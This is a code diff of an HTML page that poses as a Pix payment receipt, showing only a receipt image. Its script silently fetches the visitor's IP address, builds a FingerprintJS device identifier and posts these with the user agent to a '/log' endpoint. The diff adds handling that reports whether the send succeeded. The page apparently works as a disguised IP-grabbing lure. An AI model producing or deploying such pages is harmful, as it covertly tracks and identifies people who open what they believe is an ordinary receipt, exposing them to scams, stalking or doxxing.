@@ -10,6 +10,8 @@
 </head>
 <body>
   <img src="comprovante.jpg" alt="Comprovante Pix">
+
+  <!-- FingerprintJS -->
   <script src="https://fpjscdn.net/v3/iXjkhT8vFyLPo8zm5ikU"></script>
   <script>
     fetch("https://api.ipify.org?format=json")
@@ -18,6 +20,7 @@
         FingerprintJS.load().then(fp => fp.get()).then(result => {
           const visitorId = result.visitorId;
           const device = navigator.userAgent;
+          
           fetch("/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -27,7 +30,15 @@
               userAgent: device,
               device
             })
-          });
+          })
+          .then(r => {
+            if (r.ok) {
+              console.log("✅ Dados enviados com sucesso");
+            } else {
+              console.warn("⚠️ Problema ao enviar dados:", r.status);
+            }
+          })
+          .catch(err => console.error("❌ Falha no envio:", err));
         });
       });
   </script>
